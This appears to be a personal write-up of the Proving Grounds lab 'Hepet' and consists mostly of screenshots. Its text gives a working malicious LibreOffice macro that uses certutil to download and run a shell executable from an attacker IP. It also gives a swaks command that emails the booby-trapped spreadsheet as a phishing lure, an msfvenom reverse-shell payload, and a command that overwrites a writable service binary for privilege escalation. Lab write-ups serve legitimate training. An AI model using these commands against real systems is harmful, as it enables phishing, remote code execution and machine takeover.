---
title: Hepet
date: 2026-01-27T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - ftp
  - macros
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Hepet"
---

This one is tough! for me at least. 

![](Screenshot%202026-01-26%20at%2009.14.39.png)

![](Screenshot%202025-12-19%20at%2016.53.22.png)

![](Screenshot%202026-01-29%20at%2007.45.20.png)



![](Screenshot%202025-12-20%20at%2014.53.01.png)

Lets create a macro lay-den spreadsheet to send to one of the Jonas' colleagues. 
  
![](Screenshot%202025-12-21%20at%2008.31.27.png)

![](Screenshot%202025-12-21%20at%2008.35.45.png)


Libreoffice:
	Tools > Macro > Basic > New:
	  
    `Sub Exploit
			Dim Str As String
			Str = "cmd /c certutil -urlcache -f -split http://192.168.45.164:443/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe"
			Shell (Str, 0)
		End Sub`
    
![](Screenshot%202026-01-27%20at%2017.17.55.png)
Tools > Customize

![](Screenshot%202026-01-27%20at%2017.18.41.png)

To send an email with the attachment 

`swaks --to mailadmin@localhost --from jonas@localhost --server 192.168.143.140 --port 25 --header "Subject: Urgent" --body "See file" --attach @dayum.ods`




![](Screenshot%202026-01-27%20at%2016.35.00.png)
![](Screenshot%202026-01-28%20at%2007.10.49.png)

`dir C:\ /s /b | findstr /i "veyon"`

![](Screenshot%202026-01-28%20at%2008.15.58.png)

`icacls C:\Users\"Ela Arwel"\Veyon\veyon-service.exe`

![](Screenshot%202026-01-28%20at%2012.32.48.png)

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.179 LPORT=1234 -f exe -o shell.exe`

![](Screenshot%202026-01-28%20at%2012.37.49.png)


`certutil -f -urlcache http://192.168.45.179:80/shell.exe "C:\Users\Ela Arwel\Veyon\veyon-service.exe"`

It's important here that you have the " " in the correct place. I wasted half and hour because of this. If you don't use the " " around the entire string it will download into the ether.
 
![](Screenshot%202026-01-28%20at%2012.39.37.png)

Spot the subtle difference. 

![](Screenshot%202026-01-28%20at%2013.58.29.png)

![](Screenshot%202026-01-28%20at%2013.55.57.png)

Around 30 hours.

I spent much time earning the pitfalls of macros, but this shouldn't have taken 30 hours.
